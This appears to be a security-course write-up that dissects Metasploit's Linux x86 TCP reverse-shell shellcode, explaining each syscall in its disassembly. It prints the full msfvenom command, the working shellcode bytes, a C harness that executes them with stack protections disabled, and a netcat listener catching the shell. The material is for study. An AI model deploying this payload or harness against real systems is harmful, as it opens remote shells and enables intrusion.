# Shellcode No.2 - TCP Reverse Shell

At second glance, we'll take payload linux/x86/shell_reverse_tcp, very similar to the shellcode we wrote in the second SLAE exam task.

------------------------------------------------------------------------------------------------------------------------
Again, we'll use msfvenom for shellcode generation:
```sh
$ msfvenom -p linux/x86/shell_reverse_tcp LPORT=1234 LHOST=127.0.0.1 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```
------------------------------------------------------------------------------------------------------------------------
shellcode.c wrapped updating:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
------------------------------------------------------------------------------------------------------------------------
Compiling and executing:
```sh
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  26
```
------------------------------------------------------------------------------------------------------------------------
In the second terminal we can use netcat for setting up a listener:
```sh
$ nc -nvlp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 55473)
id
uid=1000(slae) gid=1000(slae) groups=1000(slae),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)
```

Fantastic, everything works fine. As we see, again there are some null bytes, which breaks our "Shellcode Length" counter.

------------------------------------------------------------------------------------------------------------------------
Let's use ndisasm again.
```sh
$ echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" | ndisasm -u -
```
```nasm
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  687F000001        push dword 0x100007f
0000001D  68020004D2        push dword 0xd2040002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
```
------------------------------------------------------------------------------------------------------------------------

The analysis of this shellcode will be divided into four parts, corresponding to the system calls called. 

### socket() ###
```nasm
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80			
```
At the beginning a socket is prepared. For this purpose, socket() syscall is used, called from socketcall()) syscall, taking the following arguments as components: socket(AF_INET, SOCK_STREAM, IPPROTO_IP). 

- For this purpose, the EBX, EAX and EDX registers are first cleaned. Using the mul instruction reduces the shellcode length by 1.
```nasm
00000000  31DB              xor ebx,ebx					
00000002  F7E3              mul ebx
```

Then, in the reverse order, the values of the above arguments are thrown onto the stack. In order:
- The value 0 is pushed on the stack (IPPROTO_IP = 0)
```nasm
00000004  53                push ebx
```
- EBX is incremented so that you can use it both when calling socket() (sys_socket = 1), and by placing the second argument on the stack
```nasm
00000005  43                inc ebx 
```
- Value 1 is pushed on the stack (SOCK_STREAM = 1)
```nasm
00000006  53                push ebx 	
```
- Value 2 is pushed on the stack (AF_INET = 2)
```nasm
00000007  6A02              push byte +0x2 
```
- Stack pointer (ESP) is directed to the arguments of the socket() system call
```nasm
00000009  89E1              mov ecx,esp 
```
- Socketcall() syscall is called, creating socket with our socket() syscall - sockfd
```nasm
0000000B  B066              mov al,0x66 
```
- After syscall, the sockfd address will be stored in the EAX registry 
```nasm
0000000D  CD80              int 0x80	
```			
------------------------------------------------------------------------------------------------------------------------

### dup2() ###
```nasm
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
```
Then three dup2() syscalls will be called. For this shellcode, a loop that is executed three times (STDIN = 0, STDOUT = 1, STDERR = 2) will be used for this.
- We exchange values of EAX and EBX registers
```nasm
0000000F  93                xchg eax,ebx
```
- Pop address from top of the stack to the ECX registry (it is a value of 3, as many as the loop should be repeated)
```nasm
00000010  59                pop ecx
```
- Moving value 63 to the EAX registry
```nasm
00000011  B03F              mov al,0x3f
```
- Syscall execution
```nasm
00000013  CD80              int 0x80
```
- ECX registry decrementation (3 --> 2)
```nasm
00000015  49                dec ecx
```
- Loop operating dup2() system calls
```nasm
00000016  79F9              jns 0x11
```
------------------------------------------------------------------------------------------------------------------------

### connect() ###
```nasm
00000018  687F000001        push dword 0x100007f
0000001D  68020004D2        push dword 0xd2040002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
```

Then connect() syscall is called. First, we are pushing the IP address and port values on the stack to which our reverse shell should connect.
- Push out address 127.0.0.1 (in reverse order)
```nasm
00000018  687F000001        push dword 0x100007f
```
- Pushing out port 1234 (in reverse order) and the value of `word 2`, being the argument: AF_INET = 2
```nasm
0000001D  68020004D2        push dword 0xd2040002
```
- Stack pointer (ESP) is directed to the arguments of the struct
```nasm
00000022  89E1              mov ecx,esp
```
- Socketcall() syscall is called
```nasm
00000024  B066              mov al,0x66
```
- Pushing 0 (string terminator)
```nasm
00000026  50                push eax
```
- Pushing const struct sockaddr *addr - stack pointer with struct arguments
```nasm
00000027  51                push ecx
```
- Pushing our sockfd pointer
```nasm
00000028  53                push ebx
```
- sys_connect() call
```nasm
00000029  B303              mov bl,0x3
```
- Stack pointer (ESP) is directed to the arguments of the connect() system call
```nasm
0000002B  89E1              mov ecx,esp
```
- syscall execution
```nasm
0000002D  CD80              int 0x80
```
------------------------------------------------------------------------------------------------------------------------

### execve() ###
```nasm
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
```
The last syscall will be execve(), which will send /bin/sh shell to specified address:port.
- Pushing string terminator (null) on the stack
```nasm
0000002F  52                push edx
```
- Pushing value "n/sh" on the stack (reverse order)
```nasm
00000030  686E2F7368        push dword 0x68732f6e
```
- Pushing value "//bi" on the stack (reverse order)
```nasm
00000035  682F2F6269        push dword 0x69622f2f
```
- We transfer the top of the stack address to the EBX registry
```nasm
0000003A  89E3              mov ebx,esp
```
- Another string terminator 
```nasm
0000003C  52                push edx
```
- Pushing previous stack pointer 
```nasm
0000003D  53                push ebx
```
- Setting new stack pointer pointing our arguments
```nasm
0000003E  89E1              mov ecx,esp
```
- Moving 11 (value of execve() syscall) to EAX
```nasm
00000040  B00B              mov al,0xb
```
- Syscall execution
```nasm
00000042  CD80              int 0x80
```
------------------------------------------------------------------------------------------------------------------------
That's all, reverse shell working properly.

### Pwned. ###

------------------------------------------------------------------------------------------------------------------------
